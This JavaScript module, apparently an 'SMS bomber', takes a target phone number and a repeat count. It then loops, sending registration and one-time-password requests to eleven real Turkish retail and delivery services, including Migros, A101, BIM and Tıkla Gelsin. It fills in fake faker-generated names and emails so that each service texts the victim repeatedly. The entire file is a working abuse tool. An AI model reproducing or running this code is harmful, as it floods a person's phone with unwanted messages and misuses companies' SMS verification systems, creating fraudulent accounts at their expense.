const request = require('request');
const colors = require('colors');
const title = require('./title.js');
const moment = require('moment');
const faker = require('faker');

async function delay(s) { return new Promise(resolve => setTimeout(resolve, s * 1000)); }

async function smsBOOM(numara, miktar) {
    let dataFSms = {
        baslangic_tarihi: moment().format('DD.MM.YYYY HH:mm:ss'),
        numara: numara,
        hatali: 0,
        basarili: 0,
    };

    function kigili(no) {
        request.post({
            url: 'https://www.kigili.com/users/registration/',
            form: {
                "first_name": faker.name.firstName(),
                "last_name": faker.name.lastName(),
                "email": faker.internet.email(),
                "phone": "0"+no,
                "password": "nwejkfıower32",
                "confirm": "true",
                "kvkk": "true",
                "next": ""
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 202) {
                dataFSms.basarili++;
                console.log(`[+] Kigili - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Kigili - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function kahvedunyasi(no) {
        request.post({
            url: 'https://core.kahvedunyasi.com/api/users/sms/send',
            form: {
                "mobile_number": no,
                "token_type": "register_token"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Kahve Dunyasi - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Kahve Dunyasi - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function naosstars(no) {
        request.post({
            url: 'https://shop.naosstars.com/users/register',
            form: {
                "email": faker.internet.email(),
                "first_name": faker.name.firstName(),
                "last_name": faker.name.lastName(),
                "password": "nwejkfıower32",
                "date_of_birth": "1999-01-01",
                "phone": "0"+no,
                "gender": "male",
                "kvkk": "true",
                "contact": "true",
                "confirm": "true"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 202) {
                dataFSms.basarili++;
                console.log(`[+] Naosstars - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Naosstars - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function wmf(no) {
        request.post({
            url: 'https://www.wmf.com.tr/users/register/',
            form: {
                "confirm": "true",
                "date_of_birth": "1956-03-01",
                "email": faker.internet.email(),
                "email_allowed": "true",
                "first_name": faker.name.firstName(),
                "gender": "male",
                "last_name": faker.name.lastName(),
                "password": "nwejkfıower32",
                "phone": "0"+no,
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 202) {
                dataFSms.basarili++;
                console.log(`[+] WMF - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] WMF - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function bim(no) {
        request.post({
            url: 'https://bim.veesk.net:443/service/v1.0/account/login',
            json: {
                "phone": no,
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Bim - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Bim - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function sok(no) {
        request.post({
            url: 'https://api.ceptesok.com:443/api/users/sendsms',
            json: {
                "mobile_number": no,
                "token_type": "register_token"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Sok - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Sok - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function migros(no) {
        request.post({
            url: 'https://rest.migros.com.tr:443/sanalmarket/users/login/otp',
            json: {
                "phoneNumber": no,
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Migros - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Migros - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function a101(no) {
        request.post({
            url: 'https://www.a101.com.tr:443/users/otp-login/',
            json: {
                "phone": "0"+no,
                "next": "/a101-kapida"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] A101 - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] A101 - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function englishhome(no) {
        request.post({
            url: 'https://www.englishhome.com:443/enh_app/users/registration/',
            form: {
                "first_name": faker.name.firstName(),
                "last_name": faker.name.lastName(),
                "email": faker.internet.email(),
                "phone": "0"+no,
                "password": "nwejkfıower32",
                "email_allowed": "true",
                "sms_allowed": "true",
                "confirm": "true",
                "tom_pay_allowed": "true"
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Englishhome - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Englishhome - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }

    function sakasu(no) {
        request.post({
            url: 'https://www.sakasu.com.tr:443/app/api_register/step1',
            form: {
                "phone": "0"+no,
            }
        }, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Sakasu - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Sakasu - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
    }
    
    function tiklagelsin(no) {
		request("https://www.tiklagelsin.com/user/graphql", {
		  "headers": {
			"accept": "*/*",
			"accept-language": "tr,tr-TR;q=0.9,en-US;q=0.8,en;q=0.7",
			"content-type": "application/json",
			"sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
			"sec-ch-ua-mobile": "?0",
			"sec-ch-ua-platform": "\"Windows\"",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"x-device-type": "3",
			"x-merchant-type": "0",
			"x-no-auth": "true",
			"Referer": "https://www.tiklagelsin.com/a/",
			"Referrer-Policy": "strict-origin-when-cross-origin"
		  },
		  "body": `{\"operationName\":\"GENERATE_OTP\",\"variables\":{\"phone\":\"+90${no}",\"challenge\":\"85033055-4b81-4f6f-aed2-4a8ee1dce968\",\"deviceUniqueId\":\"web_6f59c0e5-3a0a-4bd3-907d-3cd973152333\"},\"query\":\"mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\\n  generateOtp(\\n    phone: $phone\\n    challenge: $challenge\\n    deviceUniqueId: $deviceUniqueId\\n  )\\n}\\n\"}`,
		  "method": "POST"
		}, function (err, httpResponse, body) {
            if (httpResponse?.statusCode == 200) {
                dataFSms.basarili++;
                console.log(`[+] Tıkla Gelsin - ${no} - ${dataFSms.basarili}`.green);
            } else {
                dataFSms.hatali++;
                console.log(`[-] Tıkla Gelsin - ${no} - ${dataFSms.hatali}`.red);
            }
           title(`Telefon: ${numara} - Miktar: ${miktar} - Basarili: ${dataFSms.basarili} - Hatali: ${dataFSms.hatali}`);
        });
	}

    function send(no) {
        kigili(no);
        kahvedunyasi(no);
        naosstars(no);
        wmf(no);
        bim(no);
        sok(no);
        migros(no);
        a101(no);
        englishhome(no);
        sakasu(no);
        tiklagelsin(no);
    }

    for (let i = 0; i < miktar; i++) {
        await delay(5);
        send(numara);
    }
}

module.exports = smsBOOM;
